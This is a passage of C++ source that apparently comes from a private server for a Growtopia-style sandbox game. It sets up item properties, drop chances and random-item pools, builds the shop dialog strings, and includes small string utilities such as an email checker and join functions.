7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712 , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232, 4534 , 4590 , 4628 , 4746  , 4988 , 5020 , 5088 , 5206 , 5322 , 5712  , 6294 , 6338 , 6758 , 6892 , 7192 , 7196 , 7384 , 7568 , 7570 , 7572, 7574,  7676 , 7678, 7680, 7682, 7836, 7838, 7840, 7842, 8006, 8008, 8010, 8012, 8288, 8290, 8292, 8294, 8432, 8434, 8436, 8438, 8576, 8578, 8580, 8582, 8816, 8818, 8820, 8822, 8898, 8900, 8902, 8904, 9008, 9010, 9012, 9014, 9116, 9118, 9120, 9122, 9136, 9138, 9236, 9348, 9408, 9462, 9464, 9606, 9648, 9760, 10044, 10128, 10166, 10246, 10426, 10496, 10618, 10666, 10718, 10810, 10914, 11006, 11116, 11232 };
		if (items[i].grindable_count == 0 && items[i].grindable_prize != 0) combusting.push_back("\nadd_label_with_icon|small|Burn `w" + items[i].ori_name + "`` to get `1" + items[items[i].grindable_prize].ori_name + "``|left|" + to_string(i) + "|");
		if (items[i].r_1 != 0 && items[i].r_2 != 0) splicing.push_back("\nadd_label_with_icon|small|`1" + items[i].ori_name + "`` = `w" + items[items[i].r_1].ori_name + "`` + `w" + items[items[i].r_2].ori_name + "``|left|" + to_string(i) + "|");
		if (items[i].blockType == BlockTypes::PLATFORM) items[i].collisionType = 0;
		if (i == 12014 || i == 12016 || i == 12018 || i == 12020) items[i].flagmay = 21;
		if (i == 11560 || i == 11554 || i == 11556 || i == 11558 || i == 13220 || i == 13196) items[i].flagmay = 20;
		if (i == 10956 || i == 10958 || i == 10954 || i == 10952 || i == 10960) items[i].flagmay = 18;
		if (i == 12866 || i == 12868) items[i].flagmay = 26;
		if (i == 12646 || i == 12648 || i == 12650) items[i].flagmay = 23;
		if (i == 10618) items[i].flagmay = 13;
		if (items[i].unobtainable == false && items[i].untradeable == 0) {
			if (items[i].clothingType == 6 and i % 2 == 0) {
				rare_text += "\nadd_label_with_icon|small| " + items[i].name + "|left|" + to_string(i) + "|";
				items[9386].randomitem.push_back(i);
			}
			if (items[i].clothingType == 5 and i % 2 == 0) items[9384].randomitem.push_back(i);


			if (items[i].r_1 != 0 or items[i].r_2 != 0 and items[i].rarity > 1) items[9380].randomitem.push_back(i);
			if (items[i].blockType == BlockTypes::LOCK and i != 5814 and i != 8470) {
				rainbow_text += "\nadd_label_with_icon|small| " + items[i].name + "|left|" + to_string(i) + "|";
				items[5136].randomitem.push_back(i);
			}
			if (i != 9852 and i != 8470) {
				if ((items[i].blockType == BlockTypes::LOCK or items[i].clothingType == 5 or items[i].clothingType == 6) and i % 2 == 0 and i != 5814 and i != 9852 and i != 9726) items[9902].randomitem.push_back(i);
			}
		}
		if (items[i].blockType == BlockTypes::CONSUMABLE and i != 6336 and i != 7480 and i != 9140 and i != 9110 and i != 9112 and i != 9852 and items[i].untradeable == 0)items[9600].randomitem.push_back(i);
		items[i].newdropchance = 38 - items[i].rarity / 8;
		if (items[i].newdropchance < 21)  items[i].newdropchance = 21;
		if (items[i].farmable) {
			if (items[i].rarity < 30)  items[i].newdropchance = 31;
		}
		//if (i == 3200) cout << items[i].actionType << endl;
		//if (i == 5078 || i == 5084 || i == 9212 || i == 5152 || i == 5170) items[i].chance = 5;
		//if (i == 5126 || i == 5180 || i == 7174 || i == 5150 || i == 5168) items[i].chance = 6;
		//if (i == 5128 || i == 5182 || i == 7172 || i == 5148 || i == 5166) items[i].chance = 7;
		//if (i == 5130 || i == 5184 || i == 7170 || i == 5146 || i == 5164) items[i].chance = 8;
		//if (i == 5132 || i == 5186 || i == 7168 || i == 5144 || i == 5162) items[i].chance = 9;
		if (i == 5134 || i == 5188 || i == 7166 || i == 5080 || i == 5082 || i == 9920 || i == 10126 || i == 10124 || i == 10118) items[i].chance = 10;
		if (items[i].rarity == 0 || items[i].rarity > 363)items[i].max_gems2 = 0;
		else if (items[i].r_1 == 0 or items[i].r_2 == 0) items[i].max_gems2 = 0;
		else items[i].max_gems2 = items[i].max_gems / 2.5;

		if (i == 6 || i == 8 || items[i].blockType == BlockTypes::MAIN_DOOR || i == 3760) items[i].block_possible_put = true;


		if (i != 5816 && i != 1424 && items[i].untradeable != 1 && i != 9386 && i != 9380 && i != 9384 && i != 5136) {
			if (items[i].max_gems != 0 || items[i].blockType == BlockTypes::ADVENTURE || items[i].blockType == BlockTypes::PROVIDER || items[i].blockType == BlockTypes::SEWINGMACHINE || items[i].blockType == BlockTypes::PHONE || items[i].blockType == BlockTypes::DONATION || items[i].blockType == BlockTypes::DISPLAY || items[i].blockType == BlockTypes::GROUND_BLOCK || items[i].blockType == BlockTypes::STEAM || items[i].blockType == BlockTypes::BULLETIN_BOARD || items[i].blockType == BlockTypes::MAILBOX || items[i].blockType == BlockTypes::SWITCH_BLOCK || items[i].blockType == BlockTypes::CHEST || items[i].blockType == BlockTypes::BOUNCY || items[i].blockType == BlockTypes::RANDOM_BLOCK || items[i].blockType == BlockTypes::PORTAL || items[i].blockType == BlockTypes::ANIM_FOREGROUND || items[i].blockType == BlockTypes::TRAMPOLINE || items[i].blockType == BlockTypes::DEADLY || items[i].blockType == BlockTypes::TREASURE || items[i].blockType == BlockTypes::CHEMICAL_COMBINER || items[i].blockType == BlockTypes::TOGGLE_FOREGROUND || items[i].blockType == BlockTypes::SFX_FOREGROUND || items[i].blockType == BlockTypes::PLATFORM || items[i].blockType == BlockTypes::GATEWAY || items[i].blockType == BlockTypes::CHECKPOINT || items[i].blockType == BlockTypes::SIGN || items[i].blockType == BlockTypes::DOOR || items[i].blockType == BlockTypes::BEDROCK || items[i].blockType == BlockTypes::MAIN_DOOR || items[i].blockType == BlockTypes::FOREGROUND || items[i].blockType == BlockTypes::BACKGROUND || items[i].blockType == BlockTypes::SEED || items[i].blockType == BlockTypes::PAIN_BLOCK) items[i].block_possible_put = true;
		}
		if (items[i].blockType == BlockTypes::SEED || items[i].rarity < 1 || items[i].rarity == 999 || items[i].block_possible_put == false || items[i].r_1 == 2037 || items[i].r_2 == 2037 || items[i].r_1 == 2035 || items[i].r_2 == 2035 || items[i].r_1 + items[i].r_2 == 0 || items[i].blockType == BlockTypes::CLOTHING || items[i].untradeable || i == 1424 || i == 5816 || items[i].rarity > 200) {
		}
		else items_washing.push_back(make_pair(items[i].rarity, i));

	}
	items[3938].properties = Property_AutoPickup;
	items[9960].properties = Property_AutoPickup;
	items[9946].properties = Property_AutoPickup;
	items[9948].properties = Property_AutoPickup;
	items[10358].properties = Property_AutoPickup;
	sort(zombieitem.begin(), zombieitem.end());
	for (int i = 0; i < zombieitem.size(); i++) zombie_list += "\nadd_button_with_icon|zomb_price_" + to_string(zombieitem[i].second) + "|" + setGems(zombieitem[i].first) + "ZB|noflags|" + to_string(zombieitem[i].second) + "||";
	sort(surgeryitem.begin(), surgeryitem.end());
	for (int i = 0; i < surgeryitem.size(); i++) surgery_list += "\nadd_button_with_icon|zurg_price_" + to_string(surgeryitem[i].second) + "|" + setGems(surgeryitem[i].first) + "Cd|noflags|" + to_string(surgeryitem[i].second) + "||";
	sort(wolfitem.begin(), wolfitem.end());
	reverse(wolfitem.begin(), wolfitem.end());
	for (int i = 0; i < wolfitem.size(); i++) wolf_list += "\nadd_button_with_icon|wolf_price_" + to_string(wolfitem[i].second) + "|" + setGems(wolfitem[i].first) + "Wt|noflags|" + to_string(wolfitem[i].second) + "||";
	sort(lockeitem.begin(), lockeitem.end());
	shop_list2 = "\ntext_scaling_string|Cashback Coupon 100,000 gems|";
	//string locke_color = "";
	//int locked = 0;
	for (int i = 0; i < lockeitem.size(); i++) {
		string color = "";
		if (items[lockeitem[i].second].gtwl <= 1000) color = "Blue";
		else if (items[lockeitem[i].second].gtwl <= 5000) color = "Purple";
		else color = "Yellow";
		/*
		if (locke_color != "" && locke_color != color) {
			shop_list2 += "\nadd_button_with_icon||END_LIST|noflags|0||\nadd_button_with_icon||END_LIST|noflags|0||";
		}
		locke_color = color;*/
		shop_list2 += "\nadd_button_with_icon|lock_price_" + to_string(lockeitem[i].second) + "|" + items[lockeitem[i].second].ori_name + "|static" + color + "Frame|" + to_string(lockeitem[i].second) + "|" + to_string(items[lockeitem[i].second].gtwl) + "|";
		//shop_list2 += "\nadd_button|lock_price_" + to_string(lockeitem[i].second) + "|Buy " + items[lockeitem[i].second].name + " for " + (items[lockeitem[i].second].gtwl > 200 ? to_string(items[lockeitem[i].second].gtwl / 100) : to_string(items[lockeitem[i].second].gtwl)) + " " + (items[lockeitem[i].second].gtwl > 200 ? "Diamond Lock" : "World Locks") + "|noflags|0|0|";
		//locked++;
		//if (locked >= 5)shop_list2 += "\nadd_button_with_icon||END_LIST|noflags|0||", locked = 0;
	}
	shop_list2 += "\nadd_button_with_icon||END_LIST|noflags|0||";
	sort(untradeitem.begin(), untradeitem.end());
	for (int i = 0; i < untradeitem.size(); i++) shop_list2_2 += "\nadd_button|locm_price_" + to_string(untradeitem[i].second) + "|Buy " + items[untradeitem[i].second].name + " for " + (items[untradeitem[i].second].u_gtwl > 200 ? to_string(items[untradeitem[i].second].u_gtwl / 100) : to_string(items[untradeitem[i].second].u_gtwl)) + " " + (items[untradeitem[i].second].u_gtwl > 200 ? "Diamond Lock" : "World Locks") + "|noflags|0|0|";
	sort(opc_item.begin(), opc_item.end());
	string last_color = "", a = "";
	bool first = false;
	for (int i = 0; i < opc_item.size(); i++) {
		//opc_list += "\nadd_button_with_icon|opop_price_" + to_string(opc_item[i].second) + "|" + to_string(opc_item[i].first) + " OPC|noflags|" + to_string(opc_item[i].second) + "||";
		string color = "";
		if (opc_item[i].first <= 200) color = "Blue";
		else if (opc_item[i].first <= 1000) color = "Purple";
		else color = "Yellow";

		if (first == false) {
			opc_list += "\nadd_textbox|1-200 OPC Items:|left|";
			first = true;
		}
		if (last_color != "" && last_color != color) opc_list += "\nadd_button_with_icon||END_LIST|noflags|0||\nadd_spacer|small|\nadd_textbox|" + a + (color == "Purple" ? "200-1000" : "1000+") + " OPC Items:|left|";
		last_color = color;
		opc_list += "\nadd_button_with_icon|opop_price_" + to_string(opc_item[i].second) + "||static" + color + "Frame|" + to_string(opc_item[i].second) + "|" + to_string(opc_item[i].first) + "|";
	}

	sort(premium_item.begin(), premium_item.end());
	string last_color2 = "";
	bool first2 = false;
	for (int i = 0; i < premium_item.size(); i++) {
		string color = "";
		if (premium_item[i].first <= 1000) color = "Blue";
		else if (premium_item[i].first <= 5000) color = "Purple";
		else color = "Yellow";

		if (first2 == false) {
			shop_list += "\nadd_textbox|1-1000 Premium Wl Items:|left|";
			first2 = true;
		}
		if (last_color2 != "" && last_color2 != color) shop_list += "\nadd_button_with_icon||END_LIST|noflags|0||\nadd_spacer|small|\nadd_textbox|" + a + (color == "Purple" ? "1000-5000" : "5000+") + " Premium Wl Items:|left|";
		last_color2 = color;
		shop_list += "\nadd_button_with_icon|shop_price_" + to_string(premium_item[i].second) + "||static" + color + "Frame|" + to_string(premium_item[i].second) + "|" + to_string(premium_item[i].first) + "|";
	}
	return 0;
}

bool special_char(string str_) {
	if (str_.find_first_not_of("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890") != string::npos)
		return true;
	return false;
}

bool email(string str) {
	if (str.size() > 64 or str.empty())
		return false;
	const string::const_iterator at = std::find(str.cbegin(), str.cend(), '@'), dot = std::find(at, str.cend(), '.');
	if ((at == str.cend()) or (dot == str.cend()))
		return false;
	if (std::distance(str.cbegin(), at) < 1 or std::distance(at, str.cend()) < 5)
		return false;
	return true;
}

void space_(string& usrStr) {
	char cha1, cha2;
	for (int i = 0; i < usrStr.size() - 1; ++i) {
		cha1 = usrStr[i], cha2 = usrStr[i + 1];
		if ((cha1 == ' ') && (cha2 == ' ')) {
			usrStr.erase(usrStr.begin() + 1 + i);
			--i;
		}
	}
}

string join(const vector<string>& v, string delimiter) {
	string result;
	for (size_t i = 0; i < v.size(); ++i) {
		result += (i ? delimiter : "") + v[i];
	}
	return result;
}
string join2(const vector<string> v, string delimeter, bool useand) {
	if (v.size() == 0) return "";
	string str;
	for (auto p = v.begin(); p != v.end(); ++p) {
		str += *p;
		if (p != (v.end() - 1)) str += (p == (v.end() - 2) and useand ? delimeter + "and " : delimeter);
	}
	return str;
}